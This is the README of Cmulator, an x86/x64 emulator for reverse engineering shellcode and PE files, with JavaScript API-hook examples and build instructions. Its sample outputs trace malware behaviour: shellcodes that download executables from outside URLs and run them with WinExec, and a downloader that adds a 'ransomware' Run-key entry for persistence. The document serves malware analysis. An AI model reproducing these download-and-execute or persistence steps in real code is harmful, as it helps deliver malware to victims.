# Cmulator - Scriptable x86 RE Sandbox Emulator (v0.3 Beta)

[![License: AGPL v3](https://img.shields.io/badge/License-AGPL%20v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)

<h2>
<b>
Cmulator  is ( x86 - x64 ) <br>Scriptable Reverse Engineering Sandbox Emulator for shellcode and PE binaries <br>
Based on Unicorn & Capstone Engine & javascript .
</b>

## Supported Architectures:
* i386
* x86-64

## Supported File Formats
* PE, PE+
* shellcodes

<hr>

## <a style="color:red">Known problems</a>
* there's a bug in Unicorn modifying data near EIP </br>
	if anyone can help please check [unicorn#820](https://github.com/unicorn-engine/unicorn/issues/820)
<hr>

## Current Features
* Simulated GDT & Segments.
* Simulated TEB & PEB structures for both Shellcodes and PE.
* Simulated LDR Table & Data.
* Manages Image and Stack memory.
* Evaluates functions based on DLL exports.
* Trace all Executed API ( good for Obfuscated PE).
* Displays HexDump with Strings based on referenced memory locations.
* Patching the Memory.
* Custom API hooks using Javascript (scripting).
* Handle SEH (still need more work).
* [+] Hook Address.
* [+] Apiset map resolver

<br>
<hr>


## [+] Changelog
- V0.3 Beta
  - This is the last supported Pascal version and new code base (C/C++) will be in here https://github.com/Cmulator/Cmulator . 

-	v0.2 beta
	-	[+] Add Hook Address
	-	[+] Implementing Api schema forworder
	-	[+] Change disassembler from **Capstone** to **Zydis** Engine
	-	[√] improvements for SEH handling 
	-	[√] improvements with JS to API handle
	-	[√] Improve API detection by address or name or ordinal

-	v0.1 beta
	-	Init version

<br>
<hr>
<br>

# Hook Example JavaScript

```javascript
var GetModuleFileName = new ApiHook();
/*
DWORD WINAPI GetModuleFileName(
  _In_opt_ HMODULE hModule,
  _Out_    LPTSTR  lpFilename,
  _In_     DWORD   nSize
);
*/
GetModuleFileName.OnCallBack = function (Emu, API, ret) {

	Emu.pop(); // ret
	
	var hModule    = Emu.isx64 ? Emu.ReadReg(REG_RCX) : Emu.pop();
	var lpFilename = Emu.isx64 ? Emu.ReadReg(REG_RDX) : Emu.pop();
	var nSize	   = Emu.isx64 ? Emu.ReadReg(REG_R8D) : Emu.pop();

	var mName = Emu.GetModuleName(hModule);
	var Path = 'C:\\pla\\' + mName;

	var len = API.IsWapi ? Emu.WriteStringW(lpFilename,Path) : Emu.WriteStringA(lpFilename,Path);

	// null byte - mybe needed maybe not :D - i put it anyway :V 
	API.IsWapi ? Emu.WriteWord(lpFilename + (len * 2),0) : Emu.WriteByte(lpFilename+len,0);

	print("{0}(0x{1}, 0x{2}, 0x{3}) = '{4}'".format(
		API.name,
		hModule.toString(16),
		lpFilename.toString(16),
		nSize.toString(16),
		Path
	));

	// MS Docs : the return value is the length of the string
	Emu.SetReg(Emu.isx64 ? REG_RAX : REG_EAX, len);	
	Emu.SetReg(Emu.isx64 ? REG_RIP : REG_EIP, ret);
	return true; // true if you handle it false if you want Emu to handle it and set PC .
};

GetModuleFileName.install('kernel32.dll', 'GetModuleFileNameA');
GetModuleFileName.install('kernel32.dll', 'GetModuleFileNameW');

```

```javascript
var _vsnprintf = new ApiHook();
/*
int _vsnprintf(  
   char *buffer,  
   size_t count,  
   const char *format,  
   va_list argptr   
);
*/
_vsnprintf.OnCallBack = function (Emu, API, ret) {

	// save the param to args
	// args is an Array and it's implemented in every ApiHook .
	_vsnprintf.args[0] = Emu.isx64 ? Emu.ReadReg(REG_RCX) : Emu.ReadDword(Emu.ReadReg(REG_ESP) + 4);

	// i think implementing this in JS is hard 
	// so just let the library handle it :D 
	return true; // True so we continue to the lib code .
};

// OnExit Callback ..
_vsnprintf.OnExit = function(Emu,API){
	
	// Read Our Saved Param .
	var buffer = _vsnprintf.args[0];

	warn("OnExit : _vsnprintf() = '{0}' ".format(
		Emu.ReadStringA(buffer)
	));
}

_vsnprintf.install('msvcrt.dll', '_vsnprintf');
```

<br>
<hr>


## Example Output : 

<details><summary>AntiDebug Downloader</summary>
<p>

```
Coldzer0 @ OSX $./Cmulator -f ../../samples/AntiDebugDownloader.exe -q

Cmulator Malware Analyzer - By Coldzer0

Compiled on      : 2018/09/29 - 01:51:51
Target CPU       : i386 & x86_x64
Unicorn Engine   : v1.0 
Cmulator         : v0.1

"AntiDebugDownloader.exe" is : x32
Mapping the File ..

[+] Unicorn Init done  .
[√] Set Hooks
[√] PE Mapped to Unicorn
[√] PE Written to Unicorn

[---------------- PE Info --------------]
[*] File Name        : AntiDebugDownloader.exe
[*] Image Base       : 0000000000400000
[*] Address Of Entry : 0000000000001000
[*] Size Of Headers  : 0000000000000400
[*] Size Of Image    : 0000000000004000
[---------------------------------------]

[---------------------------------------]
[            Fixing PE Imports          ]

[*] File Name  : AntiDebugDownloader.exe
[*] Import 3 Dlls

[+] Fix IAT for : kernel32.dll

[+] Fix IAT for : urlmon.dll

[+] Fix IAT for : advapi32.dll

[---------------------------------------]

[+] Segments & (TIB - PEB) Init Done .

[+] Loading JS Main Script : ../API.JS

Initiating 52 Libraries ...

[>] Run AntiDebugDownloader.exe

0x401005 : IsDebuggerPresent = 0
GetWindowsDirectoryA(403000, 260) = 10 - 'C:\Windows' 
0x40103d : URLDownloadToFileA(0, 'https://www.dropbox.com/s/fr3z6axblxfcmq8/UrlDownLoadtoFile.exe?dl=0', 'C:\Windows', 0, 0)
0x401051 : RegCreateKeyA(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', 0x403159) = 144
0x40106f : RegSetValueExA(144, 'ransomware', 0, REG_SZ, 'C:\Windows', 260)
0x40107a : RegCloseKey()
ExitProcess(0x0)

26 Branches - Executed in 9 ms

Cmulator Stop >> last Error : OK (UC_ERR_OK)



Press Enter to Close ¯\_(ツ)_/¯
```

</p>
</details>

<details><summary>x64 Down & Exec ShellCode</summary>
<p>


```
Coldzer0 @ OSX $./Cmulator -f ../../samples/Shellcodes/down_exec64.sc -sc -x64

Cmulator Malware Analyzer - By Coldzer0

Compiled on      : 2018/09/29 - 03:07:11
Target CPU       : i386 & x86_x64
Unicorn Engine   : v1.0 
Cmulator         : v0.1

"sc64.exe" is : x64
Mapping the File ..

[+] Unicorn Init done  .
[√] Set Hooks
[√] PE Mapped to Unicorn
[√] PE Written to Unicorn

[---------------- PE Info --------------]
[*] File Name        : sc64.exe
[*] Image Base       : 0000000000400000
[*] Address Of Entry : 0000000000001000
[*] Size Of Headers  : 0000000000000400
[*] Size Of Image    : 0000000000002000
[---------------------------------------]
[*] Writing Shellcode to memory ...
[√] Shellcode Written to Unicorn

[---------------------------------------]
[            Fixing PE Imports          ]

[*] File Name  : sc64.exe
[*] Import 0 Dlls

[---------------------------------------]

[+] Segments & (TIB - PEB) Init Done .

[+] Loading JS Main Script : ../API.JS

Initiating 25 Libraries ...

[>] Run sc64.exe

LoadLibraryA('urlmon') = 0x70714000
GetProcAddress(0x70714000,'URLDownloadToFileA') = 0x707ADB10
0x40111b : URLDownloadToFileA(0, 'http://192.168.10.129/pl.exe', 'C:\\Users\\Public\\p.exe', 0, 2489880)
SetFileAttributesA('C:\\Users\\Public\\p.exe',0x2)
WinExec('C:\\Users\\Public\\p.exe', 0)
FatalExit(0x0)

95 Steps - Executed in 295 ms

Cmulator Stop >> last Error : OK (UC_ERR_OK)



Press Enter to Close ¯\_(ツ)_/¯


```

</p>
</details>


<details><summary>x32 Down & Exec ShellCode</summary>
<p>


```
Coldzer0 @ OSX $./Cmulator -f ../../samples/Shellcodes/URLDownloadToFile.sc -sc

Cmulator Malware Analyzer - By Coldzer0

Compiled on      : 2018/09/29 - 03:07:11
Target CPU       : i386 & x86_x64
Unicorn Engine   : v1.0 
Cmulator         : v0.1

"sc32.exe" is : x32
Mapping the File ..

[+] Unicorn Init done  .
[√] Set Hooks
[√] PE Mapped to Unicorn
[√] PE Written to Unicorn

[---------------- PE Info --------------]
[*] File Name        : sc32.exe
[*] Image Base       : 0000000000400000
[*] Address Of Entry : 0000000000001000
[*] Size Of Headers  : 0000000000000400
[*] Size Of Image    : 0000000000002000
[---------------------------------------]
[*] Writing Shellcode to memory ...
[√] Shellcode Written to Unicorn

[---------------------------------------]
[            Fixing PE Imports          ]

[*] File Name  : sc32.exe
[*] Import 0 Dlls

[---------------------------------------]

[+] Segments & (TIB - PEB) Init Done .

[+] Loading JS Main Script : ../API.JS

Initiating 25 Libraries ...

[>] Run sc32.exe

GetProcAddress(0x70300000,'LoadLibraryA') = 0x703149D7
LoadLibraryA('urlmon.dll') = 0x7065a000
GetProcAddress(0x7065A000,'URLDownloadToFileA') = 0x706F08D0
GetProcAddress(0x70300000,'WinExec') = 0x70392C21
0x40113b : URLDownloadToFileA(0, 'https://rstforums.com/fisiere/dead.exe', 'dead.exe', 0, 0)
WinExec('dead.exe', 1)

3041 Steps - Executed in 415 ms

Cmulator Stop >> last Error : OK (UC_ERR_OK)



Press Enter to Close ¯\_(ツ)_/¯


```

</p>
</details>

<details><summary>Show SEH handling (PELock Obfuscator) </summary>
<p>

```
Coldzer0 @ OSX $./Cmulator -f ../../samples/obfuscated/obfuscated.exe -ex

Cmulator Malware Analyzer - By Coldzer0

Compiled on      : 2018/09/29 - 03:07:11
Target CPU       : i386 & x86_x64
Unicorn Engine   : v1.0 
Cmulator         : v0.1

"obfuscated.exe" is : x32
Mapping the File ..

[+] Unicorn Init done  .
[√] Set Hooks
[√] PE Mapped to Unicorn
[√] PE Written to Unicorn

[---------------- PE Info --------------]
[*] File Name        : obfuscated.exe
[*] Image Base       : 0000000000400000
[*] Address Of Entry : 000000000000A4BD
[*] Size Of Headers  : 0000000000001000
[*] Size Of Image    : 000000000000F000
[---------------------------------------]

[---------------------------------------]
[            Fixing PE Imports          ]

[*] File Name  : obfuscated.exe
[*] Import 2 Dlls

[+] Fix IAT for : KERNEL32.dll

[+] Fix IAT for : USER32.dll

[---------------------------------------]

[+] Segments & (TIB - PEB) Init Done .

[+] Loading JS Main Script : ../API.JS

Initiating 44 Libraries ...

[>] Run obfuscated.exe

EXCEPTION_ACCESS_VIOLATION READ_UNMAPPED : addr 0x0, data size = 1, data value = 0x0
0x403031 Exception caught SEH 0x25FEEC - Handler 0x409215
ZwContinue -> Context = 0x25F97C
EXCEPTION_ACCESS_VIOLATION READ_UNMAPPED : addr 0x0, data size = 4, data value = 0x0
0x4056EC Exception caught SEH 0x25FEE8 - Handler 0x402516
ZwContinue -> Context = 0x25F978
EXCEPTION_ACCESS_VIOLATION READ_UNMAPPED : addr 0x0, data size = 4, data value = 0x0
0x401974 Exception caught SEH 0x25FEE4 - Handler 0x4019CE
ZwContinue -> Context = 0x25F974
MessageBoxA(0, 'Hello world', 'Visit us at www.pelock.com', 64)
EXCEPTION_ACCESS_VIOLATION READ_UNMAPPED : addr 0x0, data size = 4, data value = 0x0
0x403A49 Exception caught SEH 0x25FEF4 - Handler 0x40A17B
ZwContinue -> Context = 0x25F984
EXCEPTION_ACCESS_VIOLATION READ_UNMAPPED : addr 0x0, data size = 4, data value = 0x0
0x40AD64 Exception caught SEH 0x25FEF4 - Handler 0x40B461
ZwContinue -> Context = 0x25F984
ExitProcess(0x0)

7387 Steps - Executed in 118 ms

Cmulator Stop >> last Error : OK (UC_ERR_OK)



Press Enter to Close ¯\_(ツ)_/¯


```

</p>
</details>

<details><summary>Hide SEH handling (PELock Obfuscator) </summary>
<p>

```
Coldzer0 @ OSX $./Cmulator -f ../../samples/obfuscated/obfuscated.exe 

Cmulator Malware Analyzer - By Coldzer0

Compiled on      : 2018/09/29 - 03:07:11
Target CPU       : i386 & x86_x64
Unicorn Engine   : v1.0 
Cmulator         : v0.1

"obfuscated.exe" is : x32
Mapping the File ..

[+] Unicorn Init done  .
[√] Set Hooks
[√] PE Mapped to Unicorn
[√] PE Written to Unicorn

[---------------- PE Info --------------]
[*] File Name        : obfuscated.exe
[*] Image Base       : 0000000000400000
[*] Address Of Entry : 000000000000A4BD
[*] Size Of Headers  : 0000000000001000
[*] Size Of Image    : 000000000000F000
[---------------------------------------]

[---------------------------------------]
[            Fixing PE Imports          ]

[*] File Name  : obfuscated.exe
[*] Import 2 Dlls

[+] Fix IAT for : KERNEL32.dll

[+] Fix IAT for : USER32.dll

[---------------------------------------]

[+] Segments & (TIB - PEB) Init Done .

[+] Loading JS Main Script : ../API.JS

Initiating 44 Libraries ...

[>] Run obfuscated.exe

MessageBoxA(0, 'Hello world', 'Visit us at www.pelock.com', 64)
ExitProcess(0x0)

7387 Steps - Executed in 116 ms

Cmulator Stop >> last Error : OK (UC_ERR_OK)



Press Enter to Close ¯\_(ツ)_/¯


```

</p>
</details>

<br>

<h3>
And Try it Your Self , find it at "samples/obfuscated/obfuscated.exe" 😉

<hr>

<br>

## WIP BY Priority :
*	Memory Manager - Next version
*	Checking for Bug & fixing them 👌🏻
*	**Api schema forwarder still need more improvements and testing**

<hr>

## TODO BY Priority :
- [x] PC (RIP - EIP) Hook.
- [x] improving exception handling.
- [x] Native Plugins & API Hook Libs.
- [x] Api schema forwarder.
- [ ] Add Memory Manager.
- [ ] **Sysenter** / **Syscall** Global Hook in JS.
- [ ] Control TEB/PEB in JS.
- [ ] Interactive debug shell.
- [ ] Add Assembler.
- [ ] Implement Threading.


<hr>

## Requirements
* Freepascal >= v3
* Unicorn Engine 
* Zydis Engine
* QuickJS Engine

<hr>

## Installation

- Install [Lazarus IDE](https://www.lazarus-ide.org/) 
- You will find all needed libraries in "libraries" Folder ;) 
- Now Build

<hr>

## Build 

### 1. Build Cmulator

```
git clone https://github.com/Coldzer0/Cmulator.git

Open "Cmulator.lpi" with Lazarus IDE 

Then Hit Compile :D
Oh Before that you need to select the Build Mode

From Laz IDE Select 

Projects -> Project Options -> Compiler Options 

and Select the Mode for your OS .

```
## Or Just Download From [Releases](https://github.com/Coldzer0/Cmulator/releases)
<br><br>

### 2. Create config.json config file

```
touch config.json
```

### 3. Set Win dlls Path

set the dll folders to where you stored your windows dlls and JS Main File . 

```
{
  "system": {
    "win32": "../win_dlls/x32_win7",
    "win64": "../win_dlls/x64_win7",
    "Apiset": "../Apiset.json"
  },
  "JS": {
  	"main": "../API.JS"
  }
}

```

## Run

```
./Cmulator -file samples/AntiDebug.exe
```

<hr>

# Documentation

## Still working on it , will be available soon.

<hr>

## Acknowledgements & Resources :
<b>

this work inspired by :

- [unicorn-libemu-shim](https://github.com/fireeye/unicorn-libemu-shim) - The Main Reason i started this Project ❤ .
- [LIBEMU](https://github.com/dzzie/VS_LIBEMU) - Hooking Methods .
- [SCDBG](https://github.com/dzzie/SCDBG) - The InterActive Debugger .
- [xori](https://github.com/endgameinc/xori) - I Used there Method To Build LDR . 

Used OpenSource Projects :
- [QuickJS Engine](https://github.com/bellard/quickjs)
- [Unicorn Engine](https://github.com/unicorn-engine/unicorn)
- [Zydis Engine](https://github.com/zyantific/zydis)
- [PE Parser](https://github.com/oranke/pe-image-for-Lazarus) 
- [Pse PE Parse](https://github.com/stievie/pesp) 
- [generics collections](https://github.com/maciej-izak/generics.collections)
- [Super Object (JSON)](https://github.com/hgourvest/superobject)


Resouces Used :
- [Microsoft Docs](https://docs.microsoft.com/en-us/windows/desktop/api/)
- [Understanding the PEB Loader
Data Structure](http://sandsprite.com/CodeStuff/Understanding_the_Peb_Loader_Data_List.html)
- [Wine](https://github.com/wine-mirror/wine)
- [Nynaeve Blog](http://www.nynaeve.net)
- [ReWolf terminus - Windows data structures ](http://terminus.rewolf.pl/terminus/)
- [OS Dev - GDT_Tutorial](https://wiki.osdev.org/GDT_Tutorial)
- [Set up a GDT in Unicorn](https://scoding.de/setting-global-descriptor-table-unicorn)



</b>

## With ❤️ From Home.
